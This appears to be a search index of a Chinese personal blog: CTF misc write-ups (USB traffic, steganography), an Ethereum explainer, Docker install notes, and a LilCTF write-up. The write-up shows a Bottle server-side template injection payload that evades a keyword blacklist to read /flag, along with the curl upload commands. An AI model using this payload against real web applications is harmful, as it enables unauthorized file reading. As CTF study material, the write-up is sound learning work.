[{"content":"MISC学习实录（二）\r因为在MiGuo的MISC课上睡大觉，所以被MiGuo惩罚来学MISC ε(┬┬﹏┬┬)3\nUSB流量分析\rUSB流量主要是鼠标流量和键盘流量\n鼠标流量\rUSB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。 其中， 第一个字节代表按键，当取0x00时，代表没有按键，为0x01时，代表按左按键，为0x02时，代表当前按键为右键； 第二个字节可以成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移动多少像素，为负时，代表水平左移多少像素； 第三个字节与第二个字节类似，代表垂直上下移动的偏移。\n键盘流量\r键盘数据包的数据长度为8个字节\nUSB使用HID协议规定键盘映射，具体映射表我没找到，具体可以翻翻HID协议\n1和2两道题的思路是一样的\n把pcap文件扔进kali，然后用tshark将 leftover capture data 提取出来：\n1 tshark -r example.pcap -T fields -e usb.capdata //如果想导入usbdata.txt文件中，后面加上参数：\u0026gt;usbdata.txt 然后看特质，长的是键盘流量，短的是鼠标流量\n最后用脚本解析\n键盘转化脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 mappings = { 0x04:\u0026#34;A\u0026#34;, 0x05:\u0026#34;B\u0026#34;, 0x06:\u0026#34;C\u0026#34;, 0x07:\u0026#34;D\u0026#34;, 0x08:\u0026#34;E\u0026#34;, 0x09:\u0026#34;F\u0026#34;, 0x0A:\u0026#34;G\u0026#34;, 0x0B:\u0026#34;H\u0026#34;, 0x0C:\u0026#34;I\u0026#34;, 0x0D:\u0026#34;J\u0026#34;, 0x0E:\u0026#34;K\u0026#34;, 0x0F:\u0026#34;L\u0026#34;, 0x10:\u0026#34;M\u0026#34;, 0x11:\u0026#34;N\u0026#34;,0x12:\u0026#34;O\u0026#34;, 0x13:\u0026#34;P\u0026#34;, 0x14:\u0026#34;Q\u0026#34;, 0x15:\u0026#34;R\u0026#34;, 0x16:\u0026#34;S\u0026#34;, 0x17:\u0026#34;T\u0026#34;, 0x18:\u0026#34;U\u0026#34;,0x19:\u0026#34;V\u0026#34;, 0x1A:\u0026#34;W\u0026#34;, 0x1B:\u0026#34;X\u0026#34;, 0x1C:\u0026#34;Y\u0026#34;, 0x1D:\u0026#34;Z\u0026#34;, 0x1E:\u0026#34;1\u0026#34;, 0x1F:\u0026#34;2\u0026#34;, 0x20:\u0026#34;3\u0026#34;, 0x21:\u0026#34;4\u0026#34;, 0x22:\u0026#34;5\u0026#34;, 0x23:\u0026#34;6\u0026#34;, 0x24:\u0026#34;7\u0026#34;, 0x25:\u0026#34;8\u0026#34;, 0x26:\u0026#34;9\u0026#34;, 0x27:\u0026#34;0\u0026#34;, 0x28:\u0026#34;n\u0026#34;, 0x2a:\u0026#34;[DEL]\u0026#34;, 0X2B:\u0026#34; \u0026#34;, 0x2C:\u0026#34; \u0026#34;, 0x2D:\u0026#34;-\u0026#34;, 0x2E:\u0026#34;=\u0026#34;, 0x2F:\u0026#34;[\u0026#34;, 0x30:\u0026#34;]\u0026#34;, 0x31:\u0026#34;\\\\\u0026#34;, 0x32:\u0026#34;~\u0026#34;, 0x33:\u0026#34;;\u0026#34;, 0x34:\u0026#34;\u0026#39;\u0026#34;, 0x36:\u0026#34;,\u0026#34;, 0x37:\u0026#34;.\u0026#34; } nums = [] keys = open(\u0026#39;usbdata.txt\u0026#39;) for i in keys: i = i.strip() line = \u0026#34;\u0026#34; for j in range(0,len(i),2): line += i[j:j+2] + \u0026#34;:\u0026#34; line = line[:len(line)-1] # print(line) if line[0]!=\u0026#39;0\u0026#39; or line[1]!=\u0026#39;0\u0026#39; or line[3]!=\u0026#39;0\u0026#39; or line[4]!=\u0026#39;0\u0026#39; or line[9]!=\u0026#39;0\u0026#39; or line[10]!=\u0026#39;0\u0026#39; or line[12]!=\u0026#39;0\u0026#39; or line[13]!=\u0026#39;0\u0026#39; or line[15]!=\u0026#39;0\u0026#39; or line[16]!=\u0026#39;0\u0026#39; or line[18]!=\u0026#39;0\u0026#39; or line[19]!=\u0026#39;0\u0026#39; or line[21]!=\u0026#39;0\u0026#39; or line[22]!=\u0026#39;0\u0026#39;: continue nums.append(int(line[6:8],16)) keys.close() output = \u0026#34;\u0026#34; for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += \u0026#39;[unknown]\u0026#39; print(\u0026#39;output : \u0026#39; + output) # 脚本跑的结果中去掉unknow，注意del键 鼠标转化脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 nums = [] keys = open(\u0026#39;./mouse_data.txt\u0026#39;,\u0026#39;r\u0026#39;) f = open(\u0026#39;xy.txt\u0026#39;,\u0026#39;w\u0026#39;) posx = 0 posy = 0 for i in keys: line = \u0026#34;\u0026#34; i = i.strip() for j in range(0,len(i),2): line += i[j:j+2] + \u0026#34;:\u0026#34; line = line[:len(line)-1] if len(line) != 11 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x \u0026gt; 127 : x -= 256 if y \u0026gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : # 1 代表左键 // 这里0，1，2都试试 f.write(str(posx)) f.write(\u0026#39; \u0026#39;) f.write(str(posy)) f.write(\u0026#39;\\n\u0026#39;) f.close() from PIL import Image img = Image.new(\u0026#39;RGB\u0026#39;,(2000,2000),(255,255,255))#创建Image对象 f =open(\u0026#39;xy.txt\u0026#39;)#xy.txt文件 for line in f.readlines(): point =line.split() img.putpixel((int(point[0]),int(point[1])),(0,0,0))#读取文件中的每一行，并修改像素 f.close() img.show() 第三题是BUU原题\n给一个rar和一个ftm\n尝试解压rar失败\n由于RAR是有四个文件块组成的，分别是标记块、归档头部块、文件块、结束块，这些块之间没有固定地先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块。详情看：\nCTF解题技能之压缩包分析基础篇\n我们把rar 扔进010提示模块三有错误，对照博客中的内容（文件块的HEAD_TYPE应该是0x74而不是0x7A。）把 7A改成74\n然后解压得到一个png\n把png扔进stegsolve发现在Blue plane 0 有二维码\n扫码得到ci{v3erf_0tygidv2_fc0}\n还有key.ftm没用到，有key说明flag被加密了\n把key.ftm扔进010，发现有“PK”,尝试搜索 50 4B 03 04 ，说明ftm中藏了一个zip，把50 4Bpcap前的内容全部删去，再保存为zip\n解压得到一个pcap，用tshark提取leftover capture data，发现是键盘流量，跑脚本拿到key： XINAN\n加密方式是维吉尼亚+栅栏\n解密得到flag\nflag{vig3ne2e_is_c00l}\nMISC常见加密方法：\nCTF 常见密码编码及其解决方案\n","date":"2025-10-07T10:29:47+08:00","permalink":"https://Oight.github.io/p/misc%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95%E4%BA%8C/","title":"MISC学习实录（二）"},{"content":"区块链学习（一）\r区块链作为较为前沿的领域，近几年也在迅速发展\n最开始接触区块链的内容是从较新的move-sui体系开始的，这个后面另外再写博客介绍吧（挖坑+1）\n最近接触到了更为成熟的以太坊体系\n所以写博客记录一下（主要是因为Ethereum 测试网水龙头太多了）\n区块链浏览器\r区块链浏览器，是指提供用户浏览与查询区块链链上信息的工具。它和普通的浏览器不同，它只能查询区块链信息上的工具，它是建立在普通的中心化网络上，专门为用户提供浏览与查询区块链上信息的一种搜索工具。如何利用区块链浏览器查询地址交易信息和区块数据等基础信息，几乎成了每个WEB3人的必备技能。\n每个区块链系统都有本身特定的浏览器，比如，比特币区块链浏览器只能查询比特币的相关区块信息，以太坊区块链浏览器只能查询以太坊的相关区块信息。\n以太 Sepolia 区块链浏览器：\nSepolia.ethrescan\n区块链浏览器相关术语\r区块 Block\n区块是指一批交易的组合，并且包含链中上一个区块的哈希。这将区块连接在一起（成为一个链），因为哈希是从区块数据中加密得出的。这可以防止欺诈，因为历史上任何区块的一次更改都会使所有后续区块无效，因为所有后续哈希都会更改，并且运行区块链的每个人都会注意到。\n创世区块 Genesis Block\n区块链上的第一个区块，用于初始化特定的区块链以及原生加密货币。\n区块链 Blockchain\n以太坊网络中由工作量证明验证的区块序列，每个区块与其前一个区块相连，可一直追溯到创世区块。它没有区块大小限制，而使用gas 上限来调整区块大小。\n交易情况：可以通过查询钱包地址来查询余额或者交易的详细信息。比如你知道某人的比特币地址，由于区块链的公开透明性，当你在比特币区块链浏览器上查询此地址时，你可以看到它的所有交易记录。\n一般区块链浏览器中有三个地方可能出现明文数据：\nInput Data / Full Input（常见位置在 “Input Data” 或 “Function \u0026amp; Input Data”）\nLogs / Event Logs（有时 dev 会把可读字符串塞在 event data 里）\nInternal Txns / Token Transfers / Contract Creation（如果这笔交易是合约创建，合约字节码里可能藏字符串）\nInput Data ：\r在以太坊协议中，\n当交易（transaction）为合约创建时，input data 是账户初始化程序的 EVM 代码；\n而当交易（transaction）为消息调用时，input data 是合约函数调用数据。\n正常情况下简单的消息调用如调用转账函数时需要填写你要转账的地址 _to 和你要转账的数量 _amount，这些基本信息都包含在 input data 里面。\n详见：交易Input Data 解析\nLogs and Event Logs\rEthereum日志和事件是Ethereum生态系统中的重要组成部分。使开发人员能够通过其跟踪并记录智能合约在区块链上的特定操作或数据。\nEVM中的事件和日志\n在EVM（以太坊虚拟机）中，事件是智能合约在执行重要操作时发出的消息。例如，当代币转移或合约数据更新时，合约会触发一个事件以通知外部系统。事件通过event关键字在智能合约中定义。\n在上述示例中，Transfer事件用于记录代币转移。它有三个参数：\nfrom：发送方地址。\nto：接收方地址。\nvalue：转移的金额。\n在执行智能合约函数期间使用emit关键字触发时间。发出的事件数据存储在日志中，这些日志是交易回执的一部分。\n日志：\n日志是这些事件的记录。当事件发生时，它们会存储有关所发生情况的信息，例如发送者、接收者和转移的代币数量。日志被包含在交易回执中，使其易于检索以进行跟踪或分析。\n通过触发事件并将其记录为交易收据中的日志，开发人员可以轻松追踪特定的操作，如代币转移、铸造、销毁或合约状态的变更。这种方式节省了存储空间并降低了交易的Gas费用，为与智能合约交互和理解智能合约行为提供了高效且具有成本效益的方法。\n详见：以太坊链上 logs和events 解析\nContract\r这一部分就是大名鼎鼎的智能合约了，Ethereum的智能合约使用Solidity语言编写，关于智能合约，将会另写一篇博客详细探索一下\n这里需要注意的是如果作者没有开源自己的智能合约的话，区块链浏览器上只能看到编译好的字节码，这种情况下想要了解合约内容就需要逆向字节码\n如何开源自己的智能合约：Web3 开发智能合约部署及合约验证全流程\n区块链测试网\r目前我主要接触的是Sepolia测试网\n什么是测试网\r测试网被设计成模仿主网环境，以使开发人员能够在将合约部署到主网之前测试和排除应用程序的问题，而不会有任何价值处于风险之中。\n通常情况下，将任何合约代码在测试网上进行测试，然后再部署到主网上被认为是一个良好的做法 - 大多数链上应用程序都会在测试网上部署副本，以便开发人员进行故障排除。\n简单来说，就是由于区块链与资产息息相关，开发者在开发的时候自然不能在主链上测试，避免造成巨大的损失；为了方便开发者测试自己的区块链应用，出于测试和学习的目的，开辟了一条新的链作为测试网。\n测试网和主网的差异只是测试网上的虚拟货币并没有价值，以太坊应用程序开发者可以在这里测试他们的智能合约，而无需花费真实的 ETH 代币\n什么是Sepolia\rSepolia是以太坊核心开发人员为智能合约应用程序开发推荐的默认测试网。Sepolia最初是由以太坊核心开发人员于2021年10月推出的一种权威性测试网。该网络后来转变为一种权益证明共识机制，以模拟以太坊主网的运行环境。\nSepolia使用了一组经过授权的验证器。由于它是一个相对较新的测试网络，状态较小，因此该网络同步速度快，运行节点所需的存储空间比主网或其他测试网要少。这些功能对于希望直接与网络交互并运行节点的开发人员非常有用。\n与其他以太坊测试网络（如Goerli）相比，Sepolia测试网的测试网ETH通证总供应量没有上限，这使得使用Sepolia的开发人员更有可能在未来继续访问测试网通证。\nEthereum Sepolia 测试网水龙头：\nZAN水龙头\nalchemy\n谷歌云\nother\n","date":"2025-10-07T10:29:47+08:00","permalink":"https://Oight.github.io/p/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%80/","title":"区块链学习（一）"},{"content":"MISC学习实录（一）\r因为在MiGuo的MISC课上睡大觉，所以被MiGuo惩罚来学MISC ε(┬┬﹏┬┬)3\n图片隐写\r1.RGB\r把图片用PS打开提取RGB然后转16进制拿flag（MISC就是史）\n2.LSB隐写\rLSB隐写原理：\rRGB 中的每个通道（红、绿、蓝）都是一个 0~255 的整数（即 8位）：\n​ 255 = 11111111 ​ 128 = 10000000 ​ 17 = 00010001\n最低位（最右边一位）叫做 LSB（Least Significant Bit），改动它对人眼几乎不可见。\nLSB隐写的本质\n图像中每个像素的颜色由RGB三个通道组成，每个通道是一个 0~255（8位） 的整数：\n数字 二进制（8位） 218 11011010 150 10010110 149 10010101 每个颜色的最后一位（最低有效位，即 LSB）可以轻微改变，而不会被人眼察觉。比如：\n11011010（LSB是0） 改成 11011011（LSB是1） 10010110（LSB是0） 改成 10010111（LSB是1）\n我们就可以用这些最低位来“编码”我们要隐藏的秘密数据的二进制位。\n解题：\n使用StegSolve打开图片，选择Analyse，选中RGB右侧最低位，翻到最上面拿到flag\n3.附加信息\r给了两个文件，hidetxt.png和hidezip.png,把hidezip.png扔进010找到zip文件的文件头 50 4B 03 04 然后将zip文件头前面的全部删除，再将文件重命名为hide.zip，解压得到flag\n把hidetxt.png改为hide.txt，然后扔进010拖到最后拿到flag\n4.宽高\r图片的IHDR控制图片的长度和宽度，把图片扔进010，定位到IHDR 部分，然后改高度的16进制，得到flag\n5.zlib\r这个不会\n6.IDAT\r一个 PNG 文件格式为：\n1 文件头（89 50 4E 47 0D 0A 1A 0A） + 数据块 + 数据块 + 数据块…… + 文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82） PNG 定义了两种类型的数据块，一种是称为关键数据块，这是标准的数据块，另一种叫做辅助数据块，这是可选的数据块。关键数据块定义了4个标准数据块，每个 PNG 文件都必须包含它们。\nIHDR（文件头数据块）\n第一块是文件头数据块（IHDR），它由第11——32字节组成（从0开始），包含有 PNG 文件中存储的图像数据的基本信息，数据从第 16字节开始，有13个字节，其前8字节分别用4个字节规定了图片的宽和高（十六进制，以像素为单位）。\nIDAT（图像数据块）\n它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。它采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩。\nIDAT 隐写\nIDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块。程序读取图像的时候也会在第一个未满的块停止（查了下W3C标准，其实是PNG图片在压缩的时候会在最后一个块的标记位标明这是最后一个数据块）。所以如果某一块没有满但后面却还有 IDAT 块则说明后面的块是“假”的。\n我们可以用 pngcheck -v [文件名] 去查看PNG文件数据块信息，然后利用 python zlib 解压多余IDAT块的内容，此时注意剔除长度、数据块类型及末尾的CRC校验值。\n1 2 3 4 5 import zlib import binascii IDAT = \u0026#34; \u0026#34;.decode(\u0026#39;hex\u0026#39;) #双引号中填IDAT数据 result = binascii.hexlify(zlib.decompress(IDAT)) print(result) 将图片放进kali中，使用binwalk 分离，得到15AAFB，发现是625个二进制，每二十五为一行拆开，然后将1转为黑块，0转为白块，得到一个二维码，扫描得到flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # 1. 导入图像处理所需库（需先安装 Pillow：pip install pillow） from PIL import Image, ImageDraw # 2. 定义您提供的 01 原始数据（每行对应图像的一行，共 25 行） binary_data = [ \u0026#34;1111111000100001101111111\u0026#34;, \u0026#34;1000001011100101101000001\u0026#34;, \u0026#34;1011101010000000001011101\u0026#34;, \u0026#34;1011101001000000001011101\u0026#34;, \u0026#34;1011101011101101001011101\u0026#34;, \u0026#34;1000001010101101101000001\u0026#34;, \u0026#34;1111111010101010101111111\u0026#34;, \u0026#34;0000000010111011100000000\u0026#34;, \u0026#34;1101001100000101001110110\u0026#34;, \u0026#34;1111010101001000011100000\u0026#34;, \u0026#34;0000001010000000010010011\u0026#34;, \u0026#34;0100010011100111101110011\u0026#34;, \u0026#34;1100001110111110001100101\u0026#34;, \u0026#34;0001100111000010101000110\u0026#34;, \u0026#34;1000111101011000001010001\u0026#34;, \u0026#34;0110000011011101100100001\u0026#34;, \u0026#34;1100111001000010111111101\u0026#34;, \u0026#34;0000000011010100100011110\u0026#34;, \u0026#34;1111111011100001101011011\u0026#34;, \u0026#34;1000001000011001100011110\u0026#34;, \u0026#34;1011101000110100111110000\u0026#34;, \u0026#34;1011101011000111010011100\u0026#34;, \u0026#34;1011101001001110110110001\u0026#34;, \u0026#34;1000001011000110100011000\u0026#34;, \u0026#34;1111111011010110111011011\u0026#34; ] # 3. 设置图像参数（可调整 block_size 改变图像大小） block_size = 15 # 每个 0/1 对应 15x15 像素的方块（值越大图像越清晰） image_width = len(binary_data[0]) * block_size # 图像宽度 = 每行字符数 × 方块大小 image_height = len(binary_data) * block_size # 图像高度 = 总行数 × 方块大小 # 4. 创建白色背景图像（模式：RGB，背景色：白色 #FFFFFF） image = Image.new(\u0026#34;RGB\u0026#34;, (image_width, image_height), \u0026#34;white\u0026#34;) draw = ImageDraw.Draw(image) # 创建绘图对象，用于绘制黑色块 # 5. 遍历每个字符，绘制黑白块 for row_idx, row in enumerate(binary_data): for col_idx, char in enumerate(row): # 计算当前方块的左上角和右下角坐标 x1 = col_idx * block_size y1 = row_idx * block_size x2 = x1 + block_size y2 = y1 + block_size # 若字符为 \u0026#34;1\u0026#34;，绘制黑色块（颜色：#000000）；\u0026#34;0\u0026#34; 保留白色背景 if char == \u0026#34;1\u0026#34;: draw.rectangle([x1, y1, x2, y2], fill=\u0026#34;black\u0026#34;) # 6. 保存并显示图像 image.save(\u0026#34;binary_black_white.png\u0026#34;) # 保存为 PNG 文件（路径：脚本运行目录） image.show() # 自动打开图像查看（部分系统可能需要手动打开文件） print(\u0026#34;图像已生成并保存为：binary_black_white.png\u0026#34;) ","date":"2025-10-06T10:31:09+08:00","permalink":"https://Oight.github.io/p/misc%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95%E4%B8%80/","title":"MISC学习实录（一）"},{"content":"LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;uploads\u0026#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;static\u0026#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;sock\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;bul\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;open\u0026#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr \u0026gt;\u0026gt; 16) \u0026amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(\u0026#39;/\u0026#39;) def index(): return static_file(\u0026#39;index.html\u0026#39;, root=STATIC_DIR) @route(\u0026#39;/static/\u0026lt;filename\u0026gt;\u0026#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(\u0026#39;/upload\u0026#39;) def upload_page(): return static_file(\u0026#39;upload.html\u0026#39;, root=STATIC_DIR) @post(\u0026#39;/upload\u0026#39;) def upload(): zip_file = request.files.get(\u0026#39;file\u0026#39;) if not zip_file or not zip_file.filename.endswith(\u0026#39;.zip\u0026#39;): return \u0026#39;Invalid file. Please upload a ZIP file.\u0026#39; if len(zip_file.file.read()) \u0026gt; MAX_FILE_SIZE: return \u0026#39;File size exceeds 1MB. Please upload a smaller ZIP file.\u0026#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, \u0026#39;upload.zip\u0026#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return \u0026#39;Symbolic links are not allowed.\u0026#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return \u0026#39;Path traversal detected.\u0026#39; z.extractall(extract_dir) except zipfile.BadZipFile: return \u0026#39;Invalid ZIP file.\u0026#39; files = os.listdir(extract_dir) files.remove(\u0026#39;upload.zip\u0026#39;) return template(\u0026#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}\u0026#34;, files=\u0026#34;, \u0026#34;.join(files), md5=md5_hash, first_file=files[0] if files else \u0026#34;nofile\u0026#34;) @route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \u0026#34;File not found.\u0026#34; with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() if contains_blacklist(content): return \u0026#34;you are hacker!!!nonono!!!\u0026#34; try: return template(content) except Exception as e: return f\u0026#34;Error rendering template: {str(e)}\u0026#34; @error(404) def error404(error): return \u0026#34;bbbbbboooottle\u0026#34; @error(403) def error403(error): return \u0026#34;Forbidden: You don\u0026#39;t have permission to access this resource.\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n可以看到这里有一个上传的路由/upload,可以用POST方法上传一个zip文件，经过一系列校验没问题后就会把zip文件里的内容渲染到/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;路由。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \u0026#34;File not found.\u0026#34; with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() if contains_blacklist(content): return \u0026#34;you are hacker!!!nonono!!!\u0026#34; try: return template(content) except Exception as e: return f\u0026#34;Error rendering template: {str(e)}\u0026#34; 可以看到就是渲染的这里出了问题，由于黑名单设置得比较脆弱，会导致如果绕过了拦截，危险代码就会被执行；\n利用方法： 在Bottle文档中有这样一段话：\nThe template engine allows you to embed lines or blocks of python code within your template. Code lines start with \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;%\u0026lt;/span\u0026gt; and code blocks are surrounded by \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;\u0026lt;%\u0026lt;/span\u0026gt; and \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;%\u0026gt;\u0026lt;/span\u0026gt; tokens:\n1 2 3 4 5 6 7 % name = \u0026#34;Bob\u0026#34; # a line of python code \u0026lt;p\u0026gt;Some plain text in between\u0026lt;/p\u0026gt; \u0026lt;% # A block of python code name = name.title().strip() %\u0026gt; \u0026lt;p\u0026gt;More plain text\u0026lt;/p\u0026gt; `\nbottle框架允许嵌入Python代码，代码行以%开头；\n显然%并不在黑名单范围内\n所以可以写Python代码：\n1 2 3 % import fileinput % m = \u0026#39;\u0026#39;.join(fileinput.input(\u0026#39;/flag\u0026#39;)) % raise Exception(m) 然后打包进zip；由于这里没有办法直接传包，只留了接口，所以用curl传下参（比赛中不知道为什么完全传不上去啊QAQ）\n1 2 curl -X POST \u0026#34;http://gz.imxbt.cn:20568/upload\u0026#34; \\ -F \u0026#34;file=@exp.zip;type=application/zip;filename=exp.zip\u0026#34; 1 2 3 4 curl -X POST \u0026#34;http://gz.imxbt.cn:20568/upload\u0026#34; -F \u0026#34;file=@exp.zip;type=application/zip;filename=exp.zip\u0026#34; 文件列表: exp.txt 访问: /view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt 访问http://gz.imxbt.cn:20568/view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt得到flag\n","date":"2025-09-01T10:31:09+08:00","permalink":"https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/","title":"LilCTF复现"},{"content":"前言\r由于上次不小心执行rm -rf /*导致了我的电脑焕然一新（）\n之后一直在尝试重新搭建博客，然而由于放弃了原有的Hexo选择了Hugo，导致进展一直不甚顺利\n不过在经过多次尝试和调整之后，新的博客也是搭好了，后面可以正常更新了。\n虽然还有一些问题没处理好，但是大体记录学习过程的目的还是能达到的，小问题就暂且按下不表吧（）\nDocker学习\r关于Docker\r众所周知Docker是一个容器引擎，性能很好。\n详细了解：\nDocker\nDocker 教程\nDebian Docker 安装\rDocker 支持以下的 64 位 Debian 版本：\nDebian Bookworm 12 （稳定版） Debian Bullseye 11 （旧稳定版） 支持的架构包括 x86_64（amd64）、armhf、arm64 和 ppc64le。\n卸载旧版本\r如果你之前安装过 Docker Engine 之前，你需要卸载旧版本，避免冲突：\n1 for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done 使用官方安装脚本自动安装\r安装命令如下：\n1 2 curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 手动安装（推荐）\r1. 更新软件包\r首先，更新现有的软件包和包缓存：\n1 2 sudo apt update sudo apt upgrade 2. 安装依赖包\r安装一些需要的依赖包，这些包允许 apt 使用 HTTPS 协议来访问 Docker 仓库：\n1 sudo apt install apt-transport-https ca-certificates curl software-properties-common 3. 添加 Docker 官方 GPG 密钥\r使用下面的命令来添加 Docker 官方的 GPG 密钥：\n1 2 sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc sudo chmod a+r /etc/apt/keyrings/docker.asc 4. 添加 Docker 仓库\r添加 Docker 官方的 APT 软件源：\n1 2 3 4 5 6 echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\ $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null # 更新 sudo apt-get update 5. 更新 APT 软件包缓存\r添加仓库后，更新 APT 包索引：\n1 sudo apt update 确保你现在从 Docker 官方仓库安装 Docker 而不是 Debian 默认仓库：\n1 apt-cache policy docker-ce 你应该看到它指向 https://download.docker.com/，确保这就是官方的 Docker 仓库。\n6. 安装 Docker\r现在，你可以安装 Docker：\n1 sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 7. 启动并验证 Docker\r启动 Docker 并设置为开机自启：\n1 2 sudo systemctl start docker sudo systemctl enable docker 你可以使用以下命令来验证 Docker 是否安装成功：\n1 sudo docker --version 运行以下测试命令确保 Docker 正常工作：\n1 sudo docker run hello-world 卸载 docker\r删除安装包：\n1 sudo apt-get purge docker-ce 删除镜像、容器、配置文件等内容：\n1 sudo rm -rf /var/lib/docker Docker 基本命令\r这里记录一下Docker基本命令，方便查（其实感觉查菜鸟教程更快一点() ）\n命令 功能 示例 docker run 启动一个新的容器并运行命令 docker run -d ubuntu docker ps 列出当前正在运行的容器 docker ps docker ps -a 列出所有容器（包括已停止的容器） docker ps -a docker build 使用 Dockerfile 构建镜像 docker build -t my-image . docker images 列出本地存储的所有镜像 docker images docker pull 从 Docker 仓库拉取镜像 docker pull ubuntu docker push 将镜像推送到 Docker 仓库 docker push my-image docker exec 在运行的容器中执行命令 docker exec -it container_name bash docker stop 停止一个或多个容器 docker stop container_name docker start 启动已停止的容器 docker start container_name docker restart 重启一个容器 docker restart container_name docker rm 删除一个或多个容器 docker rm container_name docker rmi 删除一个或多个镜像 docker rmi my-image docker logs 查看容器的日志 docker logs container_name docker inspect 获取容器或镜像的详细信息 docker inspect container_name docker exec -it 进入容器的交互式终端 docker exec -it container_name /bin/bash docker network ls 列出所有 Docker 网络 docker network ls docker volume ls 列出所有 Docker 卷 docker volume ls docker-compose up 启动多容器应用（从 docker-compose.yml 文件） docker-compose up docker-compose down 停止并删除由 docker-compose 启动的容器、网络等 docker-compose down docker info 显示 Docker 系统的详细信息 docker info docker version 显示 Docker 客户端和守护进程的版本信息 docker version docker stats 显示容器的实时资源使用情况 docker stats docker login 登录 Docker 仓库 docker login docker logout 登出 